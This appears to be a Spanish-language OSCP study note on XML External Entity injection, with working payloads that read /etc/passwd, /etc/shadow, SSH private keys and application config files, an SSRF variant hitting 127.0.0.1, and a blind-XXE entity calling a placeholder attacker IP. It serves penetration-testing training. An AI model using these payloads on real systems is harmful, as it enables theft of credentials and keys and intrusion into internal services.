# XXE — XML External Entity

## ¿Qué es?

Cuando una web procesa XML que tú controlas, inyectas una entidad externa que ordena al servidor leer archivos locales o hacer peticiones internas.

XML tiene un sistema de "atajos" llamado entidades:
```xml
<!ENTITY nombre "Jorge">
```
XXE abusa de esto para que la entidad sea el contenido de un archivo del servidor en vez de un texto.

---

## Dónde aparece

Cualquier funcionalidad que procese XML:

```
- Subida de archivos XML o SVG
- APIs con Content-Type: application/xml
- Importación de documentos (Word, Excel, RSS)
- Campos de búsqueda con XML por detrás
```

Lo reconoces interceptando con Burp y viendo XML en la petición.

---

## El ataque básico — leer archivos

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

El servidor resuelve `&xxe;` leyendo `/etc/passwd` y te devuelve su contenido.

---

## Qué puedes leer

```xml
file:///etc/passwd
file:///etc/shadow
file:///home/usuario/.ssh/id_rsa
file:///var/www/html/config.php     ← credenciales de la app
file:///proc/self/environ           ← variables de entorno
```

---

## XXE como SSRF

XXE también hace peticiones internas:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1/admin">
]>
<root>
  <data>&xxe;</data>
</root>
```

Mismo resultado que SSRF — acceso a recursos internos.

---

## Cómo testear en Burp

```
1. Interceptas petición con XML
2. Añades la entidad antes del primer elemento
3. Usas &xxe; dentro del XML
4. Miras la respuesta

Si ves /etc/passwd en la respuesta → vulnerable
```

---

## Blind XXE — cuando no ves la respuesta

El servidor procesa el XML pero no devuelve el contenido:

```xml
<!ENTITY xxe SYSTEM "http://TU_IP/test">
```

```bash
# En Kali
python3 -m http.server 80

# Si recibes la petición → XXE confirmado aunque sea ciego
```

---

## Flujo completo en una máquina

```
1. Interceptas con Burp petición que contiene XML
2. Inyectas entidad SYSTEM apuntando a file:///etc/passwd
3. Si responde con el archivo → lees lo que necesites
4. Buscas credenciales, llaves SSH, archivos de config
5. Si no responde → pruebas blind XXE con tu IP
```

---

## En el OSCP

Aparece en máquinas Medium/Hard. Normalmente para:

```
Leer config.php     → credenciales de base de datos
Leer id_rsa         → clave SSH de otro usuario
Leer /etc/passwd    → enumerar usuarios del sistema
SSRF interno        → acceder a servicios internos
```

---

## Resumen mental

```
Ves XML en Burp          → posible XXE
Inyectas file:///etc/passwd → ¿lo devuelve?
Si sí → lees archivos críticos
También funciona como SSRF → http://127.0.0.1
Sin respuesta → blind XXE con tu IP
```

## Referencias
- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- https://portswigger.net/web-security/xxe
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
